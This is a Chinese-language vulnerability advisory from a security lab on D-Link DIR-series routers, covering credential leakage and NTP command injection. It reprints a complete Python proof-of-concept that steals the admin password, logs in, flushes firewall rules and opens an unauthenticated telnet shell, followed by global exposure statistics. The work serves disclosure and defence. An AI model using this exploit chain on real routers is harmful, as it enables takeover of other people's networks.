作者：知道创宇404实验室

报告发布日期：2017年08月11日

PDF 版报告下载：[D-Link
路由器信息泄露和远程命令执行漏洞分析及全球数据分析报告](https://paper.seebug.org/papers/Archive/D-Link%20%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%85%A8%E7%90%83%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.pdf
"D-Link 路由器信息泄露和远程命令执行漏洞分析及全球数据分析报告")

#### 0x00 背景

[D-Link](http://us.dlink.com
"D-Link")（即友讯网络）[1]，一家生产网络硬件和软件产品的企业，主要产品有交换机、无线产品、宽带产品、网卡、路由器、网络摄像机和网络安全产品(防火墙)等。

2017年8月8号，SecuriTeam在博客公布了D-Link
850L多个漏洞的[漏洞细节和PoC](https://blogs.securiteam.com/index.php/archives/3364
"漏洞细节和PoC")[2]，其中包括通过WAN和LAN的远程代码执行、通过WAN和LAN口的未授权信息泄露、通过LAN的root远程命令执行。

2017年8月9日，Seebug收录了该厂商旗下D-Link
DIR-850L云路由器的[多个漏洞](https://www.seebug.org/vuldb/ssvid-96333
"多个漏洞")[3]。攻击者通过路由器公网入口可获取路由器后台登录凭证并执行任意代码。

知道创宇404实验室本地测试发现多款D-Link DIR系列路由器也受到该漏洞影响。

根据ZoomEye的探测和分析，存在漏洞的D-Link路由器型号如下：

![](https://images.seebug.org/content/images/2017/09/de376e88-ffbf-4b40-a5b1-4bbdd84e0630.png-w331s)

D-Link供应商已经发布了补丁Firmware: 1.14B07
BETA[修复该漏洞](http://support.dlink.com/ProductInfo.aspx?m=DIR-850L "修复该漏洞")[4]。

#### 0x01 漏洞分析

这个漏洞由两个漏洞组成，通过第一个漏洞和第二个漏洞，可以形成完整的攻击链。根据公布的PoC我们可以分析漏洞的成因。

下面是PoC的代码。

    
    
    #!/usr/bin/env python3
    # pylint: disable=C0103
    #
    # pip3 install requests lxml
    #
    import hmac
    import json
    import sys
    from urllib.parse import urljoin
    from xml.sax.saxutils import escape
    import lxml.etree
    import requests
    
    try:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    except:
    pass
    
    TARGET = sys.argv[1]
    COMMAND = ";".join([
    "iptables -F",
    "iptables -X",
    "iptables -t nat -F",
    "iptables -t nat -X",
    "iptables -t mangle -F",
    "iptables -t mangle -X",
    "iptables -P INPUT ACCEPT",
    "iptables -P FORWARD ACCEPT",
    "iptables -P OUTPUT ACCEPT",
    "telnetd -p 23090 -l /bin/date" # port 'Z2'
    ])
    
    session = requests.Session()
    session.verify = False
    
    ############################################################
    
    print("Get password...")
    
    headers = {"Content-Type": "text/xml"}
    cookies = {"uid": "whatever"}
    data = """<?xml version="1.0" encoding="utf-8"?>
    <postxml>
    <module>
    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
    </module>
    </postxml>"""
    
    resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, cookies=cookies, data=data)
    # print(resp.text)
    
    # getcfg: <module>...</module>
    # hedwig: <?xml version="1.0" encoding="utf-8"?>
    # : <hedwig>...</hedwig>
    accdata = resp.text[:resp.text.find("<?xml")]
    
    admin_pasw = ""
    
    tree = lxml.etree.fromstring(accdata)
    accounts = tree.xpath("/module/device/account/entry")
    for acc in accounts:
    name = acc.findtext("name", "")
    pasw = acc.findtext("password", "")
    print("name:", name)
    print("pass:", pasw)
    if name == "Admin":
    admin_pasw = pasw
    
    if not admin_pasw:
    print("Admin password not found!")
    sys.exit()
    
    ############################################################
    
    print("Auth challenge...")
    resp = session.get(urljoin(TARGET, "/authentication.cgi"))
    # print(resp.text)
    
    resp = json.loads(resp.text)
    if resp["status"].lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
    
    print("uid:", resp["uid"])
    print("challenge:", resp["challenge"])
    
    session.cookies.update({"uid": resp["uid"]})
    
    print("Auth login...")
    user_name = "Admin"
    user_pasw = admin_pasw
    
    data = {
    "id": user_name,
    "password": hmac.new(user_pasw.encode(), (user_name + resp["challenge"]).encode(), "md5").hexdigest().upper()
    }
    resp = session.post(urljoin(TARGET, "/authentication.cgi"), data=data)
    # print(resp.text)
    
    resp = json.loads(resp.text)
    if resp["status"].lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
    print("OK")
    
    ############################################################
    
    data = {"SERVICES": "DEVICE.TIME"}
    resp = session.post(urljoin(TARGET, "/getcfg.php"), data=data)
    # print(resp.text)
    
    tree = lxml.etree.fromstring(resp.content)
    tree.xpath("//ntp/enable")[0].text = "1"
    tree.xpath("//ntp/server")[0].text = "metelesku; (" + COMMAND + ") & exit; "
    tree.xpath("//ntp6/enable")[0].text = "1"
    
    ############################################################
    
    print("hedwig")
    
    headers = {"Content-Type": "text/xml"}
    data = lxml.etree.tostring(tree)
    resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, data=data)
    # print(resp.text)
    
    tree = lxml.etree.fromstring(resp.content)
    result = tree.findtext("result")
    if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
    print("OK")
    
    ############################################################
    
    print("pigwidgeon")
    
    data = {"ACTIONS": "SETCFG,ACTIVATE"}
    resp = session.post(urljoin(TARGET, "/pigwidgeon.cgi"), data=data)
    # print(resp.text)
    
    tree = lxml.etree.fromstring(resp.content)
    result = tree.findtext("result")
    if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
    print("OK")

hedwig.cgi会调用fatlady.php来应用设置加载配置。这里我们可以通过设置service来加载任何php后缀的文件。

/htdocs/webinc/fatlady.php

![](https://images.seebug.org/content/images/2017/09/72de3cf4-baf8-42db-b3a6-13f00f520f6f.png-w331s)

这里我们可以通过加载配置文件来列出用户账户的口令。

/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php

![](https://images.seebug.org/content/images/2017/09/1974ead2-035d-4712-b83d-c5e6f8751efe.png-w331s)

获得管理员口令后，我们可以登陆并出发第二个漏洞 – NTP服务器shell命令注入。

![](https://images.seebug.org/content/images/2017/09/dd49a803-1b56-4f93-a985-3200c36a9b6c.png-w331s)

通过请求getcfg.php来加载DEVICE.TIME.php页面。

/htdocs/web/getcfg.php

![](https://images.seebug.org/content/images/2017/09/f2fe79e4-8352-4f74-b6c9-cbe7de02e766.png-w331s)

跟入DEVICE.TIME.php页面。

这里server变量没有任何过滤直接拼入命令。

![](https://images.seebug.org/content/images/2017/09/50a2bc5a-c3d7-41c6-a3d5-75f030131673.png-w331s)

通过上述两个漏洞，我们就可以无限制命令执行。

以下为漏洞证明：

![](https://images.seebug.org/content/images/2017/09/14674871-9013-4d91-ad95-5402f743b57a.png-w331s)

![](https://images.seebug.org/content/images/2017/09/271aeaa8-5018-43e7-8cfc-8cab648f4c97.png-w331s)

成功命令执行。

#### 0x02 数据分析

根据ZoomEye网络空间搜索引擎截止到2017年8月9日探测和分析的数据，对存在漏洞的D-Link路由器进行全球范围的分析，如下图所示。

![](https://images.seebug.org/content/images/2017/09/490095c2-eb3e-4a5c-b870-c9eabff70b79.png-w331s)
图1 D-Link DIR系列路由器信息泄露和远程命令执行漏洞全球态势

上图是此次D-Link DIR系列路由器信息泄露和远程命令执行漏洞的全球分析结果。通过上图可以大体了解到哪些国家和地区的D-Link
DIR系列路由器设备正在面临严重的安全威胁。存在威胁的D-Link DIR系列路由器在较为发达的国家和地区比较多。

下图是受影响国家和地区top10的数据分析。

![](https://images.seebug.org/content/images/2017/09/42bff850-ea3e-434a-b982-e0209b89089c.png-w331s)
图2 受到D-Link DIR系列路由器漏洞威胁的国家和地区top10

可以看到存在漏洞的D-Link
DIR系列路由器在新加坡、韩国和美国尤其多，已经超过1000条记录，新加坡更是超过了2000条记录。其他国家和地区也存在不少。如果修复不及时，很有可能被黑客利用，破坏受威胁国家和地区的网络设施，造成重要数据泄露、网络瘫痪等不可挽回的严重后果。

下图是国内的情况。

![](https://images.seebug.org/content/images/2017/09/c94a7dbd-5043-4789-94a1-e06664f6c7bd.png-w331s)
图3 国内受到D-Link DIR系列路由器漏洞威胁的地区

将目光转至国内。中国内地可以探测到的受威胁的路由器设备并不多，仅有19条记录。有安全隐患的D-Link
DIR系列路由器更多集中在我国台湾省和香港地区，一共有843条记录。中国内地探测到的受此次漏洞威胁的路由器不多的原因可能有两点：1.国内公网IP数稀少，分配给D-Link路由器过于奢侈；2. D-Link DIR系列路由器在国内销量不高。

接下来从路由器型号的角度进行分析。

![](https://images.seebug.org/content/images/2017/09/94262959-4d63-450e-a61f-6090e7f1e354.png-w331s)
图4 D-Link DIR系列路由器漏洞版本分布 （内圈表示型号。外圈表示内圈对应型号的各个固件版本）

可以看到路由器型号中DIR-868L与DIR-850L受影响比较严重，DIR-868L占了大约31.66%，而DIR-850L大约占了21.67%。

从固件版本来分析，DIR-868L的1.03SHC、1.09版本固件受影响数量多，分别占比7.03%、5.24%，DIR-850L的1.15固件版本受影响数量较多，占比5.22%，DIR-610的1.01占比8.11%，以及DIR-601N+的1.00版本的固件占比7.15%，以上受影响的固件版本占比均超过5%。

下图是受影响路由器型号详细的数据分析。

![](https://images.seebug.org/content/images/2017/09/14accb1b-1174-42a4-a16e-5c431eaeecc1.png-w331s)
图5 受威胁的路由器型号分布

受漏洞威胁的路由器型号集中在DIR-868L、DIR-850L这两个型号上，共有5909条记录。从图表中同样可以看出存在漏洞的路由器型号和固件版本影响范围之广。

下面从路由器连接端口的统计数据进行分析。

![](https://images.seebug.org/content/images/2017/09/42722238-9baf-471a-aca5-1d214510a5b9.png-w331s)
图6 路由器登陆端口top10分布

从端口上来分析，路由器登陆入口大多集中在常见的8080和80端口。开在其他端口的情况也有很多，端口分布广泛。

#### 0x03 总结

这次D-Link DIR系列路由器远程命令执行漏洞是通过两个漏洞的配合：首先利用信息泄露获得账号及口令，然后利用NTP的漏洞执行任意命令。

此次D-Link DIR系列路由器漏洞危害十分严重。黑客如果拿下路由器就相当于获得了该网络的控制权。所以请相关人员及时打上补丁，或者联系专业人员处理。

通过ZoomEye的全球数据分析可以看到，此次漏洞影响十分广泛，牵扯到全球很多国家和地区。

飞速发展的物联网给我们带来便利的同时，危险也悄然而至。云路由让我们可以方便地控制远在天边的设备。但与此同时，不怀好意之人也在觊觎你暴露在网络上的私有财产。所以我们在享受网络的同时，也需要时刻注意网络安全维护。

#### 0x04 相关链接

[1] D-Link官网：<http://us.dlink.com>

[2] 漏洞详情及PoC：<https://blogs.securiteam.com/index.php/archives/3364>

[3] SeeBug 收录：<https://www.seebug.org/vuldb/ssvid-96333>

[4] 官方补丁：<http://support.dlink.com/ProductInfo.aspx?m=DIR-850L>

#### 0x05 更新情况

![](https://images.seebug.org/content/images/2017/09/e1de310f-37bc-4030-9a54-1d5c9c03888f.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/385/>

